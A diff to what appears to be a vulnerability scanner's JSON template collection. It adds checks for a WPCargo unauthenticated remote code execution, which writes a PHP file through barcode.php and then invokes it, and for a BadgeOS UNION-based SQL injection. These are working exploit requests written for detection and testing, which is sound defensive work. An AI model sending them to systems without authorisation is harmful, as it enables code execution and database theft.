@@ -15480,6 +15480,22 @@
       ]
     },
     {
+      "id": "CVE-2021-25003",
+      "info": {
+        "name": "WPCargo < 6.9.0 - Unauthenticated Remote Code Execution",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /wp-content/plugins/wpcargo/includes/{{randstr}}.php HTTP/1.1\nHost: {{Hostname}}\n",
+            "GET /wp-content/plugins/wpcargo/includes/barcode.php?text=x1x1111x1xx1xx111xx11111xx1x111x1x1x1xxx11x1111xx1x11xxxx1xx1xxxxx1x1x1xx1x1x11xx1xxxx1x11xx111xxx1xx1xx1x1x1xxx11x1111xxx1xxx1xx1x111xxx1x1xx1xxx1x1x1xx1x1x11xxx11xx1x11xx111xx1xxx1xx11x1x11x11x1111x1x11111x1x1xxxx&sizefactor=.090909090909&size=1&filepath={{randstr}}.php HTTP/1.1\nHost: {{Hostname}}\n",
+            "POST /wp-content/plugins/wpcargo/includes/{{randstr}}.php?1=var_dump HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\n2={{md5(num)}}\n"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2021-25008",
       "info": {
         "name": "The Code Snippets WordPress Plugin < 2.14.3 - Cross-Site Scripting",
@@ -17169,8 +17185,8 @@
       "requests": [
         {
           "headers": {
-            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\"",
-            "Referer": "{{BaseURL}}/assets/base/home.html"
+            "Referer": "{{BaseURL}}/assets/base/home.html",
+            "Authorization": "Digest username=\"admin\", realm=\"Bridge-IT\", nonce=\"d24d09512ebc3e43c4f6faf34fdb8c76\", uri=\"/api/get_device_details\", response=\"d052e9299debc7bd9cb8adef0a83fed4\", qop=auth, nc=00000001, cnonce=\"ae373d748855243d\""
           },
           "method": "GET",
           "path": [
@@ -19674,6 +19690,20 @@
         {
           "raw": [
             "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\naction=answerd_ticket&id_form=1 UNION ALL SELECT NULL,NULL,md5({{num}}),NULL,NULL,NULL,NULL,NULL-- -\n"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-0817",
+      "info": {
+        "name": "BadgeOS < 3.7.1 - Unauthenticated SQL Injection",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\n\naction=get-achievements&total_only=true&user_id=11 UNION ALL SELECT NULL,CONCAT(1,md5({{num}}),1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -\n"
           ]
         }
       ]
